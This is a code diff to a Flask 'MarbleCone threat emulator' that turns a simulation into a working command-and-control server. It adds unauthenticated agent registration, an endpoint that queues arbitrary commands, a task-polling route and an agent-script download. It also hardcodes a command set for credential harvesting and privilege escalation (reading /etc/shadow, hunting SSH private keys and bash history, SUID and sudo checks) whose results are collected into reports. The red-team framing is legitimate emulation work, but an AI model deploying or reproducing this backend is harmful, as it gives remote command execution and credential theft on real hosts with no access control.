@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, jsonify, redirect, url_for, flash
+from flask import Flask, render_template, request, jsonify, redirect, url_for, flash, send_from_directory
 from flask_sqlalchemy import SQLAlchemy
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
 from werkzeug.security import generate_password_hash, check_password_hash
@@ -262,17 +262,31 @@ def create_operation():
         db.session.add(operation)
         db.session.commit()
         
-        # Start simulation in background
-        threading.Thread(target=simulate_marblecone_activities, args=(operation.id,), daemon=True).start()
+        # Send real commands to connected agents instead of simulation
+        threading.Thread(target=send_real_commands, args=(operation.id,), daemon=True).start()
         
         flash(f'Operation "{name}" started successfully!', 'success')
         return redirect(url_for('operations'))
     
     return render_template('create_operation.html', marblecone=MARBLECONE_PROFILE)
 
-@app.route('/api/agents', methods=['GET'])
-@login_required
+@app.route('/api/agents', methods=['GET', 'POST'])
 def api_agents():
+    if request.method == 'POST':
+        # Agent registration
+        data = request.get_json()
+        agent = Agent(
+            name=data['name'],
+            paw=data['paw'],
+            platform=data['platform'],
+            host=data['host'],
+            status=data.get('status', 'active')
+        )
+        db.session.add(agent)
+        db.session.commit()
+        return jsonify({'id': agent.id, 'status': 'registered'}), 200
+    
+    # GET request - return all agents
     agents = Agent.query.all()
     return jsonify([{
         'id': agent.id,
@@ -282,6 +296,49 @@ def api_agents():
         'host': agent.host,
         'status': agent.status
     } for agent in agents])
+
+@app.route('/api/agents/<paw>/tasks', methods=['GET'])
+def api_agent_tasks(paw):
+    """Get pending tasks for an agent"""
+    agent = Agent.query.filter_by(paw=paw).first()
+    if not agent:
+        return jsonify({'error': 'Agent not found'}), 404
+    
+    # Get pending tasks for this agent
+    pending_tasks = Task.query.filter_by(agent_id=agent.id, status='pending').all()
+    
+    tasks = []
+    for task in pending_tasks:
+        tasks.append({
+            'id': task.id,
+            'command': task.command,
+            'description': f'Task {task.id}'
+        })
+    
+    return jsonify({'tasks': tasks})
+
+@app.route('/api/tasks/<int:task_id>/result', methods=['POST'])
+def api_task_result(task_id):
+    """Submit task result"""
+    task = Task.query.get(task_id)
+    if not task:
+        return jsonify({'error': 'Task not found'}), 404
+    
+    data = request.get_json()
+    if not data:
+        return jsonify({'error': 'No JSON data provided'}), 400
+    
+    # Handle the agent's JSON format (result, exit_code, timestamp)
+    result = data.get('result', '')
+    exit_code = data.get('exit_code', 0)
+    timestamp = data.get('timestamp', '')
+    
+    # Store the complete result data
+    task.result = f"Exit Code: {exit_code}\nTimestamp: {timestamp}\n\nOutput:\n{result}"
+    task.status = 'completed'
+    db.session.commit()
+    
+    return jsonify({'status': 'success'})
 
 @app.route('/api/operations', methods=['GET'])
 @login_required
@@ -295,65 +352,259 @@ def api_operations():
         'created_at': operation.created_at.isoformat()
     } for operation in operations])
 
-def simulate_marblecone_activities(operation_id):
-    """Simulate MarbleCone threat activities"""
-    time.sleep(2)  # Initial delay
+@app.route('/agent/linux')
+def download_linux_agent():
+    """Download the Linux agent script"""
+    return send_from_directory(directory='.', path='marblecone_agent.sh', as_attachment=True, download_name='marblecone_agent.sh')
+
+@app.route('/api/tasks', methods=['POST'])
+def api_create_task():
+    """Create a new task for an agent"""
+    data = request.get_json()
     
-    # Simulate reconnaissance
-    task1 = Task(
-        operation_id=operation_id,
-        agent_id=1,
-        command=MARBLECONE_PROFILE['abilities'][0]['command'],
-        status='completed',
-        result='System: WIN-ABC123\nHostname: DESKTOP-ABC123\nIP: 192.168.1.100'
+    # Find the agent by PAW
+    agent = Agent.query.filter_by(paw=data['agent_paw']).first()
+    if not agent:
+        return jsonify({'error': 'Agent not found'}), 404
+    
+    # Create the task
+    task = Task(
+        operation_id=data.get('operation_id', 1),
+        agent_id=agent.id,
+        command=data['command'],
+        status='pending'
     )
-    db.session.add(task1)
+    db.session.add(task)
     db.session.commit()
     
-    time.sleep(3)
+    return jsonify({
+        'id': task.id,
+        'status': 'created',
+        'message': f'Task created for agent {agent.name}'
+    }), 201
+
+@app.route('/api/send_test_tasks', methods=['POST'])
+def send_test_tasks():
+    """Send test tasks to the connected Linux agent"""
+    # Find the Linux agent
+    agent = Agent.query.filter(Agent.name.like('linux-agent%')).first()
+    if not agent:
+        return jsonify({'error': 'No Linux agent found'}), 404
     
-    # Simulate credential harvesting
-    task2 = Task(
-        operation_id=operation_id,
-        agent_id=1,
-        command=MARBLECONE_PROFILE['abilities'][1]['command'],
-        status='completed',
-        result='[+] Found credentials:\nadmin:Password123!\nuser:SecurePass456'
-    )
-    db.session.add(task2)
+    # Test tasks for Linux
+    test_tasks = [
+        {
+            'command': 'whoami && hostname && id',
+            'description': 'User and system information'
+        },
+        {
+            'command': 'ps aux | head -10',
+            'description': 'Process listing'
+        },
+        {
+            'command': 'netstat -tuln | head -10',
+            'description': 'Network connections'
+        },
+        {
+            'command': 'ls -la /tmp',
+            'description': 'Temporary directory listing'
+        },
+        {
+            'command': 'cat /etc/passwd | head -5',
+            'description': 'User account information'
+        }
+    ]
+    
+    created_tasks = []
+    for task_data in test_tasks:
+        task = Task(
+            operation_id=1,  # Default operation
+            agent_id=agent.id,
+            command=task_data['command'],
+            status='pending'
+        )
+        db.session.add(task)
+        created_tasks.append({
+            'id': task.id,
+            'command': task.command,
+            'description': task_data['description']
+        })
+    
     db.session.commit()
     
-    time.sleep(2)
+    return jsonify({
+        'message': f'Sent {len(created_tasks)} test tasks to agent {agent.name}',
+        'tasks': created_tasks
+    }), 201
+
+def send_real_commands(operation_id):
+    """Send real commands to agents systematically"""
+    agents = Agent.query.filter_by(status='active').all()
+    if not agents:
+        print("No active agents found")
+        return
     
-    # Simulate lateral movement
-    task3 = Task(
-        operation_id=operation_id,
-        agent_id=1,
-        command=MARBLECONE_PROFILE['abilities'][2]['command'],
-        status='completed',
-        result='Successfully connected to target system'
-    )
-    db.session.add(task3)
-    db.session.commit()
+    # Enhanced command set with credential harvesting and lateral movement
+    real_commands = [
+        # Basic Reconnaissance
+        {
+            'command': 'whoami && id && groups',
+            'description': 'User identity and group information'
+        },
+        {
+            'command': 'hostname && uname -a',
+            'description': 'System information'
+        },
+        {
+            'command': 'ps aux | head -10',
+            'description': 'Process listing'
+        },
+        {
+            'command': 'netstat -tuln | head -10',
+            'description': 'Network connections'
+        },
+        {
+            'command': 'ls -la /tmp',
+            'description': 'Temporary directory listing'
+        },
+        {
+            'command': 'df -h',
+            'description': 'Disk usage information'
+        },
+        {
+            'command': 'w',
+            'description': 'Current users and system load'
+        },
+        {
+            'command': 'last | head -5',
+            'description': 'Recent login history'
+        },
+        
+        # Credential Harvesting
+        {
+            'command': 'cat /etc/passwd | head -10',
+            'description': 'User account enumeration'
+        },
+        {
+            'command': 'cat /etc/shadow 2>/dev/null || echo "Shadow file not accessible"',
+            'description': 'Password hash extraction attempt'
+        },
+        {
+            'command': 'find /home -name "*.bash_history" -exec tail -5 {} \; 2>/dev/null || echo "No bash history found"',
+            'description': 'Bash history search'
+        },
+        {
+            'command': 'find /home -name ".ssh" -type d 2>/dev/null || echo "No SSH directories found"',
+            'description': 'SSH key discovery'
+        },
+        {
+            'command': 'find /home -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null || echo "No private keys found"',
+            'description': 'Private key discovery'
+        },
+        {
+            'command': 'grep -r "password\|passwd\|pwd" /home/*/.bashrc /home/*/.profile 2>/dev/null || echo "No password references found"',
+            'description': 'Password reference search'
+        },
+        
+        # Lateral Movement Preparation
+        {
+            'command': 'cat /etc/hosts',
+            'description': 'Host file analysis'
+        },
+        {
+            'command': 'arp -a',
+            'description': 'ARP table analysis'
+        },
+        {
+            'command': 'netstat -rn',
+            'description': 'Routing table analysis'
+        },
+        {
+            'command': 'ping -c 1 8.8.8.8 2>/dev/null || echo "No internet connectivity"',
+            'description': 'Internet connectivity test'
+        },
+        {
+            'command': 'which ssh 2>/dev/null || echo "SSH not found"',
+            'description': 'SSH client availability'
+        },
+        {
+            'command': 'which nc 2>/dev/null || echo "Netcat not found"',
+            'description': 'Netcat availability'
+        },
+        {
+            'command': 'which python3 2>/dev/null || echo "Python3 not found"',
+            'description': 'Python3 availability'
+        },
+        
+        # Persistence and Privilege Escalation
+        {
+            'command': 'crontab -l 2>/dev/null || echo "No crontab found"',
+            'description': 'Scheduled tasks enumeration'
+        },
+        {
+            'command': 'ls -la /etc/cron.* 2>/dev/null || echo "No cron directories found"',
+            'description': 'System cron jobs'
+        },
+        {
+            'command': 'find / -perm -4000 -type f 2>/dev/null | head -5 || echo "No SUID files found"',
+            'description': 'SUID file discovery'
+        },
+        {
+            'command': 'sudo -l 2>/dev/null || echo "No sudo access"',
+            'description': 'Sudo privileges check'
+        },
+        {
+            'command': 'groups',
+            'description': 'Current user groups'
+        }
+    ]
     
-    time.sleep(4)
-    
-    # Simulate data exfiltration
-    task4 = Task(
-        operation_id=operation_id,
-        agent_id=1,
-        command=MARBLECONE_PROFILE['abilities'][3]['command'],
-        status='completed',
-        result='Data compressed and ready for exfiltration'
-    )
-    db.session.add(task4)
-    db.session.commit()
+    # Send commands to each agent systematically
+    for agent in agents:
+        print(f"Starting systematic command execution for agent {agent.name}")
+        
+        for i, cmd_data in enumerate(real_commands):
+            # Create task
+            task = Task(
+                operation_id=operation_id,
+                agent_id=agent.id,
+                command=cmd_data['command'],
+                status='pending'
+            )
+            db.session.add(task)
+            db.session.commit()
+            
+            print(f"Created task {task.id}: {cmd_data['description']}")
+            
+            # Wait for task completion (poll every 3 seconds, max 120 seconds)
+            max_wait = 120  # Increased from 60 to 120 seconds
+            wait_time = 0
+            while wait_time < max_wait:
+                time.sleep(3)  # Increased from 2 to 3 seconds
+                wait_time += 3
+                
+                # Check if task is completed
+                task = Task.query.get(task.id)
+                if task and task.status == 'completed':
+                    print(f"Task {task.id} completed: {cmd_data['description']}")
+                    break
+                elif wait_time >= max_wait:
+                    print(f"Task {task.id} timed out: {cmd_data['description']}")
+                    task.status = 'timeout'
+                    db.session.commit()
+                    break
+            
+            # Small delay between commands
+            time.sleep(2)  # Increased from 1 to 2 seconds
     
     # Mark operation as completed
     operation = Operation.query.get(operation_id)
     operation.status = 'completed'
     operation.completed_at = datetime.datetime.utcnow()
     db.session.commit()
+    
+    print(f"Operation {operation_id}: COMPLETED - All commands executed systematically")
+    print(f"Download the report from the Operations page to see all results!")
 
 def create_sample_data():
     """Create sample data for demonstration"""
@@ -378,6 +629,131 @@ def create_sample_data():
         db.session.add(agent)
     
     db.session.commit()
+
+@app.route('/api/agents/<int:agent_id>', methods=['DELETE'])
+def delete_agent(agent_id):
+    agent = Agent.query.get(agent_id)
+    if not agent:
+        return jsonify({'error': 'Agent not found'}), 404
+    db.session.delete(agent)
+    db.session.commit()
+    return jsonify({'status': 'deleted'})
+
+@app.route('/api/operations/<int:operation_id>', methods=['DELETE'])
+def delete_operation(operation_id):
+    operation = Operation.query.get(operation_id)
+    if not operation:
+        return jsonify({'error': 'Operation not found'}), 404
+    Task.query.filter_by(operation_id=operation_id).delete()
+    db.session.delete(operation)
+    db.session.commit()
+    return jsonify({'status': 'deleted'})
+
+@app.route('/api/operations/<int:operation_id>/report', methods=['GET'])
+def operation_report(operation_id):
+    operation = Operation.query.get(operation_id)
+    if not operation:
+        return "Operation not found", 404
+    
+    tasks = Task.query.filter_by(operation_id=operation_id).order_by(Task.id).all()
+    
+    report_lines = [
+        "=" * 80,
+        f"MARBLECONE THREAT EMULATION OPERATION REPORT",
+        "=" * 80,
+        f"Operation Name: {operation.name}",
+        f"Operation ID: {operation.id}",
+        f"Status: {operation.status.upper()}",
+        f"Created: {operation.created_at.strftime('%Y-%m-%d %H:%M:%S')}",
+        f"Completed: {operation.completed_at.strftime('%Y-%m-%d %H:%M:%S') if operation.completed_at else 'N/A'}",
+        f"Total Tasks: {len(tasks)}",
+        f"Completed Tasks: {len([t for t in tasks if t.status == 'completed'])}",
+        f"Failed Tasks: {len([t for t in tasks if t.status == 'timeout'])}",
+        "",
+        "EXECUTION SUMMARY:",
+        "-" * 40,
+    ]
+    
+    # Group tasks by agent
+    agents = {}
+    for task in tasks:
+        agent = Agent.query.get(task.agent_id)
+        if agent:
+            if agent.name not in agents:
+                agents[agent.name] = []
+            agents[agent.name].append(task)
+    
+    for agent_name, agent_tasks in agents.items():
+        report_lines.extend([
+            f"",
+            f"AGENT: {agent_name}",
+            f"Platform: {Agent.query.filter_by(name=agent_name).first().platform}",
+            f"Host: {Agent.query.filter_by(name=agent_name).first().host}",
+            f"Tasks Executed: {len(agent_tasks)}",
+            f"",
+        ])
+        
+        for i, task in enumerate(agent_tasks, 1):
+            report_lines.extend([
+                f"Task {i}: {task.command}",
+                f"Status: {task.status.upper()}",
+                f"Result:",
+                f"{task.result or 'No result available'}",
+                f"",
+                "-" * 60,
+                f"",
+            ])
+    
+    report_lines.extend([
+        "",
+        "=" * 80,
+        "REPORT GENERATED: " + datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        "MarbleCone Threat Emulator - Real Command Execution Results",
+        "=" * 80,
+    ])
+    
+    report = "\n".join(report_lines)
+    return report, 200, {
+        'Content-Type': 'text/plain; charset=utf-8', 
+        'Content-Disposition': f'attachment; filename=marblecone_operation_{operation_id}_report.txt'
+    }
+
+@app.route('/api/operations/<int:operation_id>/status', methods=['GET'])
+def api_operation_status(operation_id):
+    """Get operation status"""
+    operation = Operation.query.get(operation_id)
+    if not operation:
+        return jsonify({'error': 'Operation not found'}), 404
+    
+    tasks = Task.query.filter_by(operation_id=operation_id).all()
+    completed_tasks = len([t for t in tasks if t.status == 'completed'])
+    failed_tasks = len([t for t in tasks if t.status == 'timeout'])
+    
+    return jsonify({
+        'id': operation.id,
+        'name': operation.name,
+        'status': operation.status,
+        'total_tasks': len(tasks),
+        'completed_tasks': completed_tasks,
+        'failed_tasks': failed_tasks,
+        'created_at': operation.created_at.isoformat() if operation.created_at else None,
+        'completed_at': operation.completed_at.isoformat() if operation.completed_at else None
+    })
+
+@app.route('/api/operations/<int:operation_id>/start', methods=['POST'])
+def api_start_operation(operation_id):
+    """Start systematic command execution for an operation"""
+    operation = Operation.query.get(operation_id)
+    if not operation:
+        return jsonify({'error': 'Operation not found'}), 404
+    
+    # Start the systematic command execution in a background thread
+    import threading
+    thread = threading.Thread(target=send_real_commands, args=(operation_id,))
+    thread.daemon = True
+    thread.start()
+    
+    return jsonify({'status': 'started', 'message': 'Command execution started'})
 
 if __name__ == '__main__':
     with app.app_context():
